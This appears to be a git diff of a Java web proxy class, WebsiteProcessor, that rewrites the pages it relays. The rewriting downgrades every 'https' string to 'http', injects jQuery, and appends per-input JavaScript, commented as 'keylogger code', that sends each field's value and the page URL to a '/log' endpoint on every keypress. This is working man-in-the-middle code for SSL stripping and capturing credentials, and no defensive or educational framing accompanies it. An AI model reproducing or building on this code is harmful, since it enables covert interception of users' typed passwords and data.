@@ -47,14 +47,20 @@ public class WebsiteProcessor {
 		response.getWriter().write(modifiedHtml);
 	}
 	public String processHTML(String html,boolean isJS) throws MalformedURLException, IOException{
+		//downgrade all links to http
 		Pattern p = Pattern.compile("https");
 		Matcher m = p.matcher(html);
 		String html1 = m.replaceAll("http");
+		
 		if(isJS){
 			return html1;
 		}
 		Document doc = Jsoup.parse(html1);
+		
+		//add jquery
 		doc.head().prepend("<script src='http://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js'></script>");
+		
+		//downgrade all src href links to http
 		Elements links = doc.select("img");
 		links.addAll(doc.select("input"));
 		for(Element l:links){
@@ -64,31 +70,17 @@ public class WebsiteProcessor {
 			}
 			l.attr("src", imgSrc);
 		}
+		
+		//keylogger code
 		Elements inputs = doc.select("input");
 		for(Element input:inputs){
 			if(input.attr("id")!=null && !input.attr("id").equals("")){
-				//String jqueryStr = "document.getElementById('"+input.attr("id")+"')";
 				String jqueryStr = "'"+input.attr("id")+"-'+ "+"$('#"+input.attr("id")+"').val()";
 				String ajaxString = "$.ajax({url:'/log',data:{url:'"+getBase()+"',data:"+jqueryStr+"}})";
 				String complete = "<script> $( '#"+input.attr("id")+"' ).keypress(function() {"+ajaxString+"}) </script>";
 				doc.append(complete);
 			}
 		}
-		/*ArrayList<String> jqueryStrList = new ArrayList<String>();
-		for(Element input:inputs){
-			System.out.println(input.attr("id"));
-			if(input.attr("id").matches("user(.*)")){
-				jqueryStrList.add("'"+input.attr("id")+"-'+document.getElementById('"+input.attr("id")+"').value+' '");
-			}
-		}
-		String jqueryStr = "' '"+concatenate(jqueryStrList,"+");
-		for(Element input:inputs){
-			// "alert("+jqueryStr+");"
-			input.attr("onclick","$.ajax({url:'/log',data:{data:"+jqueryStr+"}})");
-			//$.ajax(url:'/log',data:{data:"+jqueryStr+"})");
-		}*/
-		//System.out.println(doc.toString().equals(html));
-		//return doc.toString();
 		return doc.toString();
 	}
 	public String getRawResponseAndSetBasic(String url,String method,HttpServletRequest request, HttpServletResponse response) throws IOException{
